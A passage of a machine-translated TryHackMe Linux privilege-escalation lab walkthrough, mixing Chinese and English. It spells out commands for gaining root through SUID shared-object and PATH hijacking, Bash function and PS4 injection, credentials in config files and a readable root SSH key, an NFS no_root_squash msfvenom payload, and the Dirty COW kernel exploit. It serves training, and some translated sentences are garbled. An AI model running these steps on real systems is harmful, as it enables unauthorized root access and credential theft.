nb ms nc nd aw ne bi"><span id="acfe" class="nf lt iq ms b gy ng nh l ni nj">mkdir /home/user/.config</span></pre><p id="b7d9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">示例共享对象代码可以在/home/user/tools/suid/lib calc . c中找到。在suid-so可执行文件查找代码的位置，将代码编译成共享对象:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="6f65" class="nf lt iq ms b gy ng nh l ni nj">gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</span></pre><p id="501c" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">再次执行suid-so可执行文件，注意这一次，我们得到的不是进度条，而是根shell。</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="84ea" class="nf lt iq ms b gy ng nh l ni nj">/usr/local/bin/suid-so</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pe"><img src="../Images/5cd6ab1c9a8dce0faac3fc104218d600.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pO15IpFtoYow__3XKrURlA.png"/></div></div></figure><h1 id="c344" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务13: SUID / SGID可执行文件-环境变量</h1><p id="9747" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">由于/usr/local/bin/suid-env可执行文件继承了用户的PATH环境变量，并试图在不指定绝对路径的情况下执行程序，因此可以利用该文件。</p><p id="33d2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">首先，执行该文件，注意它似乎试图启动apache2服务器:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="fe07" class="nf lt iq ms b gy ng nh l ni nj">/usr/local/bin/suid-env</span></pre><p id="df46" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在文件上运行字符串以查找可打印的字符串:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="04c5" class="nf lt iq ms b gy ng nh l ni nj">strings /usr/local/bin/suid-env</span></pre><p id="5f34" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">其中一行(“service apache2 start”)表示正在调用服务可执行文件来启动web服务器，但是没有使用可执行文件的完整路径(/usr/sbin/service)。</p><p id="0afc" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将位于/home/user/tools/suid/service . c的代码编译成一个名为service的可执行文件。这段代码只是生成了一个Bash shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="36e5" class="nf lt iq ms b gy ng nh l ni nj">gcc -o service /home/user/tools/suid/service.c</span></pre><p id="591e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将当前目录(或新服务可执行文件所在的位置)添加到PATH变量前面，并运行suid-env可执行文件以获得根shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="d024" class="nf lt iq ms b gy ng nh l ni nj">PATH=.:$PATH /usr/local/bin/suid-env</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pf"><img src="../Images/b9e50af45278eee965eac578d34bdc81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0jHiSN82EqN-AQKzpHexQg.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/846d2322f7ed829039956743cfdf2120.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*I5gBfvDHbbIbzUNktm1PSg.png"/></div></figure><h1 id="19ac" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务14: SUID / SGID可执行文件-滥用外壳功能(#1)</h1><p id="4146" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">这非常有趣。所以在低于4.2–048的bash版本中，我们可以定义类似文件路径的函数</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ph"><img src="../Images/fe93b9c4bf06337450f7376104defa74.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4d9oCJzSCXiPGZuAeV2J5g.png"/></div></div></figure><p id="b7bd" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">/usr/local/bin/suid-env2可执行文件与/usr/local/bin/suid-env相同，只是它使用服务可执行文件的绝对路径(/usr/sbin/service)来启动apache2服务器。</p><p id="7800" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">用字符串验证这一点:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="111f" class="nf lt iq ms b gy ng nh l ni nj">strings /usr/local/bin/suid-env2</span></pre><p id="77f7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在Bash版本中&lt;4.2–048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.</p><p id="6a71" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">Verify the version of Bash installed on the Debian VM is less than 4.2–048:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="c1c4" class="nf lt iq ms b gy ng nh l ni nj">/bin/bash --version</span></pre><p id="ee08" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">Create a Bash function with the name “/usr/sbin/service” that executes a new Bash shell (using -p so permissions are preserved) and export the function:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="2a06" class="nf lt iq ms b gy ng nh l ni nj">function /usr/sbin/service { /bin/bash -p; }<br/>export -f /usr/sbin/service</span></pre><p id="ce62" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">Run the suid-env2 executable to gain a root shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="9f31" class="nf lt iq ms b gy ng nh l ni nj">/usr/local/bin/suid-env2</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/b0ba84495d8b06d17ba005beb23349ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1342/format:webp/1*XuuEfTZd7_P8v6ETaUN9vA.png"/></div></figure><h1 id="77cd" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">Task 15: SUID / SGID Executables -Abusing Shell Features (#2)</h1><p id="81cf" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">so, in bash versions less than 4.4 and above, we could define the PS4 variable to display an extra prompt for debugging statements in debugging mode.</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pj"><img src="../Images/07f847c0637013cef8274160969fa306.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BKH0hcfIXH1GQnpPWQlecQ.png"/></div></div></figure><p id="dd4e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><em class="mx">注意:这在Bash版本4.4和更高版本上不起作用。</em></p><p id="869d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在调试模式下，Bash使用环境变量<strong class="ky ir"> PS4 </strong>来显示调试语句的额外提示。</p><p id="3048" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">运行<strong class="ky ir"> /usr/local/bin/suid-env2 </strong>可执行文件，启用bash调试，并将PS4变量设置为一个嵌入式命令，这将创建/bin/bash的suid版本:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="e32a" class="nf lt iq ms b gy ng nh l ni nj">env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2</span></pre><p id="c9e4" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用-p运行/tmp/rootbash可执行文件，以获得使用root权限运行的shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="229c" class="nf lt iq ms b gy ng nh l ni nj">/tmp/rootbash -p</span></pre><p id="19d1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前删除/tmp/rootbash可执行文件并退出提升的shell，因为您稍后将在房间中再次创建该文件！</strong></p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="f4b6" class="nf lt iq ms b gy ng nh l ni nj">rm /tmp/rootbash<br/>exit</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/335c0fd13709e8c9649087ee67b6fdc9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*m4brJHNOi3zL53l-jYtV7A.png"/></div></figure><h1 id="3057" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务16:密码和密钥-历史文件</h1><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/89705d22a946ab62350ae220017a0f5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:964/format:webp/1*7B3Ql8agAxg3YAQZd7oAJQ.png"/></div></figure><p id="d794" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用密码切换到root用户:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="755f" class="nf lt iq ms b gy ng nh l ni nj">su root</span></pre><h1 id="21b3" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务17:密码和密钥-配置文件</h1><p id="7976" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">配置文件通常包含明文或其他可逆格式的密码。</p><p id="ff7e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">列出用户主目录的内容:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="69b6" class="nf lt iq ms b gy ng nh l ni nj">ls /home/user</span></pre><p id="9fa1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意myvpn.ovpn配置文件的存在。查看文件的内容:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="412c" class="nf lt iq ms b gy ng nh l ni nj">cat /home/user/myvpn.ovpn</span></pre><p id="6ba0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">该文件应该包含对可以找到root用户凭据的另一个位置的引用。使用凭据切换到root用户:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="0b23" class="nf lt iq ms b gy ng nh l ni nj">su root</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pm"><img src="../Images/e76b57908277b7115a24eb0961361d90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/1*6RbD5TzZORM-vQ9BM4WLNA.png"/></div></figure><p id="103d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问题1: </strong>您在哪个文件中找到了root用户的凭证？</p><blockquote class="mu mv mw"><p id="8afb" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir"> <em class="iq">答案:/etc/openvpn/auth.txt </em> </strong></p></blockquote><h1 id="7c64" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务18:密码和密钥-SSH密钥</h1><p id="96cd" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">有时，用户会备份重要文件，但却无法使用正确的权限来保护它们。</p><p id="a209" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在系统根目录中查找隐藏的文件和目录:</p><p id="dd34" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">ls -la /</code></p><p id="74e8" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意，似乎有一个名为<strong class="ky ir">的隐藏目录。ssh </strong>。查看目录的内容:</p><p id="99d2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">ls -l /.ssh</code></p><p id="8929" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">注意，有一个全球可读的文件叫做<strong class="ky ir"> root_key </strong>。对该文件的进一步检查应该表明它是一个私有SSH密钥。该文件的名称表明它是为root用户准备的。</p><p id="6277" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将密钥复制到您的Kali框中(只查看<strong class="ky ir"> root_key </strong>文件的内容并复制/粘贴密钥更容易)，并赋予它正确的权限，否则您的SSH客户端将拒绝使用它:</p><p id="d5fb" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">chmod 600 root_key</code></p><p id="a1a6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用密钥作为根帐户登录Debian虚拟机(相应地更改IP):</p><p id="b0ea" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">ssh -i root_key root@10.10.10.10</code></p><p id="011b" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前退出根shell！</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pn"><img src="../Images/defd24ce80652b0da3bc0c9d4a82253a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/1*Z58m9xixlZsseItxACj_xw.png"/></div></figure><p id="c7ca" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将密钥复制到kali linux</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi po"><img src="../Images/ef3ea35ef1299b88fa4031464b8caf50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1326/format:webp/1*sGnRP_fBLWhpAXVrfHQ1oQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pp"><img src="../Images/9c3e1f83e87b3bf0721fb3ecdaf8d9a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LrF1J4oPlDN7vvWsDLPhSw.png"/></div></div></figure><h1 id="ca37" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务19 — NFS</h1><p id="5d6b" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">通过NFS创建的文件继承了<strong class="ky ir">远程</strong>用户的ID。如果用户是root，并且启用了root squashing，则ID将改为设置为“nobody”用户。</p><p id="39a2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">检查Debian虚拟机上的NFS共享配置:</p><p id="5872" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">在服务器上</strong></p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="40e3" class="nf lt iq ms b gy ng nh l ni nj">cat /etc/exports</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pq"><img src="../Images/421da6b01a045576110a7207be2dce12.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NJyZNXPkS_FkIssbJa9-1g.png"/></div></div></figure><p id="0e6d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意，<strong class="ky ir"> /tmp </strong>共享禁用了根挤压。</p><p id="fc66" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在您的Kali机器上，如果您还没有以root用户身份运行，请切换到root用户:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="0976" class="nf lt iq ms b gy ng nh l ni nj">sudo su</span></pre><p id="2a58" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用Kali的root用户，在您的Kali机器上创建一个挂载点，并挂载<strong class="ky ir"> /tmp </strong>共享(相应地更新IP):</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="6754" class="nf lt iq ms b gy ng nh l ni nj">mkdir /tmp/nfs<br/>mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs</span></pre><p id="0678" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">仍然使用Kali的root用户，使用<strong class="ky ir"> msfvenom </strong>生成一个有效载荷，并保存到挂载的共享中(这个有效载荷简单地调用/bin/bash):</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="0532" class="nf lt iq ms b gy ng nh l ni nj">msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf</span></pre><p id="e92e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">仍然使用Kali的根用户，使文件可执行，并设置SUID权限:</p><p id="2467" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">在工作站上</strong></p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="9b46" class="nf lt iq ms b gy ng nh l ni nj">chmod +xs /tmp/nfs/shell.elf</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pr"><img src="../Images/2dc58d1729a32b5d0cc44cd5da7035ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eVsgYZmCdQbGVuzAc0WXKg.png"/></div></div></figure><p id="f755" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">回到Debian VM，作为低特权用户帐户，执行文件以获得根shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="c985" class="nf lt iq ms b gy ng nh l ni nj">/tmp/shell.elf</span></pre><p id="718f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前退出根shell！</strong></p><p id="7785" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">在服务器上</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ps"><img src="../Images/148138857152df8130a4f9a9706fe61f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PjRy3dFMhSy3z_KgYSBhQw.png"/></div></div></figure><p id="77c2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问1: </strong>禁用根挤压的选项名称是什么？</p><blockquote class="mu mv mw"><p id="66f9" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir"> <em class="iq">答案:no_root_squash </em> </strong></p></blockquote><h1 id="1240" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务20:内核漏洞</h1><p id="0286" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">内核漏洞可能会使系统处于不稳定状态，这就是为什么您应该只在万不得已时才运行它们。</p><p id="b65a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">运行<strong class="ky ir"> Linux漏洞利用建议器2 </strong>工具来识别当前系统上潜在的内核漏洞利用:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="07cf" class="nf lt iq ms b gy ng nh l ni nj">perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</span></pre><p id="5a0e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">应该列出流行的Linux内核漏洞“Dirty COW”。Dirty COW的漏洞利用代码可以在<strong class="ky ir">/home/user/tools/kernel-exploits/Dirty COW/c0w . c</strong>找到。它将SUID文件/usr/bin/passwd替换为一个生成shell的文件(在/tmp/bak中创建了/usr/bin/passwd的备份)。</p><p id="1dc7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">编译并运行代码(注意，可能需要几分钟才能完成):</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="f319" class="nf lt iq ms b gy ng nh l ni nj">gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w<br/>./c0w</span></pre><p id="6cd2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">一旦攻击完成，运行/usr/bin/passwd获得根外壳:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="fbfc" class="nf lt iq ms b gy ng nh l ni nj">/usr/bin/passwd</span></pre><p id="b9bb" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">记得在继续之前恢复原始的/usr/bin/passwd文件并退出根shell！</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="cf9f" class="nf lt iq ms b gy ng nh l ni nj">mv /tmp/bak /usr/bin/passwd<br/>exit</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pt"><img src="../Images/0cd713b1bd5d74b05e77e4451e0a09a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VQQ3ZRCQhwi8wMW4iG41zA.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pu"><img src="../Images/c882f2fb165e7caae835cc101b49188b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CRdmHNJuLDJVM7HrYKoDxA.png"/></div></div></figure><p id="1f03" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">你可以在:<br/><strong class="ky ir">LinkedIn:-</strong><a class="ae kv" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="ky ir">Twitter:-</strong><a class="ae kv" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="ky ir">Tryhackme:-</strong><a class="ae kv" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pv"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="52c4" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="7945" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">访问我的其他演练:-</p><p id="32b9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">感谢您花时间阅读我的演练。<br/>如果您觉得有帮助，请点击👏按钮👏(高达40倍)并分享<br/>给有类似兴趣的人帮助！+随时欢迎反馈！</p></div></div>    
</body>
</html>